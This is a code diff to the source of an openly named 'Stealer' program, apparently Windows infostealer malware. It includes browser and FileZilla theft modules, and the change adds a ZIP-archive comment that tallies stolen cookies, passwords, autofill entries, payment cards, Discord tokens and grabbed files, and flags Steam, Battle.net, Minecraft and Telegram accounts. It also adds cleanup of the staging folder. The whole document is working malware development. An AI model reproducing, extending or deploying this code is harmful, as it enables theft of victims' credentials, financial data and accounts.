@@ -16,6 +16,8 @@
 #include "impl/FileZilla.h"
 #include "impl/browsers/chromium/ChromiumBrowsers.h"
 #include "impl/browsers/firefox/FirefoxBrowsers.h"
+#include "../Config.h"
+#include "../Counter.h"
 
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
@@ -51,7 +53,10 @@ void Stealer::run() {
 
 void Stealer::complete() {
     fs::path log = this->zip_log();
-    fs::remove(this->root_dir);
+    fs::remove_all(this->root_dir);
+
+    std::string cmd = "explorer.exe /select," + log.string();
+    std::system(cmd.c_str());
 }
 
 void add_file_to_zip(mz_zip_archive& zip_archive, const fs::path& file_path, const fs::path& base_path) {
@@ -67,6 +72,32 @@ void add_folder_to_zip(mz_zip_archive& zip_archive, const fs::path& folder_path,
     }
 }
 
+void add_comment_to_zip(const std::string& archive_path, const std::string& comment) {
+    std::fstream file(archive_path, std::ios::in | std::ios::out | std::ios::binary);
+    if (!file) {
+        return;
+    }
+
+    file.seekg(-22, std::ios::end);
+    std::streampos end_of_central_dir = file.tellg();
+    char buffer[22];
+    file.read(buffer, 22);
+
+    if (buffer[0] != 'P' || buffer[1] != 'K' || buffer[2] != 5 || buffer[3] != 6) {
+        return;
+    }
+
+    auto comment_size = static_cast<int>(comment.size());
+    buffer[20] = comment_size & 0xFF;
+    buffer[21] = (comment_size >> 8) & 0xFF;
+
+    file.seekp(end_of_central_dir);
+    file.write(buffer, 22);
+    file.write(comment.c_str(), comment.size());
+
+    file.close();
+}
+
 fs::path Stealer::zip_log() {
     fs::path out_zip = Utils::getTemp() / Utils::generateString(20);
     std::ofstream f(out_zip);
@@ -80,11 +111,39 @@ fs::path Stealer::zip_log() {
 
     add_folder_to_zip(zip_archive, this->root_dir, this->root_dir);
 
+    std::stringstream comment;
+
+    comment << NAME << " v" << VERSION << " - coded by .1qxz, xakerxlop with Love <3" << "\n";
+    comment << "\n";
+    comment << "== Browsers ==" << "\n";
+    comment << "Cookies: " << std::to_string(Counter::getCookies()) << "\n";
+    comment << "Passwords: " << std::to_string(Counter::getPasswords()) << "\n";
+    comment << "Auto fills: " << std::to_string(Counter::getAutoFills()) << "\n";
+    comment << "Cards: " << std::to_string(Counter::getCards()) << "\n";
+    comment << "Bookmarks: " << std::to_string(Counter::getBookmarks()) << "\n";
+    comment << "Downloads: " << std::to_string(Counter::getDownloads()) << "\n";
+    comment << "History: " << std::to_string(Counter::getHistory()) << "\n";
+    comment << "\n";
+    comment << "== Games ==" << "\n";
+    comment << "Battle.net: " << (Counter::isBattlenet() ? "Yes" : "No") << "\n";
+    comment << "Ubisoft: " << (Counter::isUbisoftConnect() ? "Yes" : "No") << "\n";
+    comment << "Minecraft: " << (Counter::isMinecraft() ? "Yes" : "No") << "\n";
+    comment << "Steam: " << (Counter::isSteam() ? "Yes" : "No") << "\n";
+    comment << "\n";
+    comment << "== Messengers ==" << "\n";
+    comment << "Telegram: " << (Counter::isTelegram() ? "Yes" : "No") << "\n";
+    comment << "Discord tokens: " << std::to_string(Counter::getDiscordTokens()) << "\n";
+    comment << "\n";
+    comment << "== Other ==" << "\n";
+    comment << "Files grabbed: " << std::to_string(Counter::getFiles()) << "\n";
+
     if (!mz_zip_writer_finalize_archive(&zip_archive)) {
         mz_zip_writer_end(&zip_archive);
         return "";
     }
 
     mz_zip_writer_end(&zip_archive);
+    add_comment_to_zip(out_zip.string(), comment.str());
+
     return out_zip;
 }
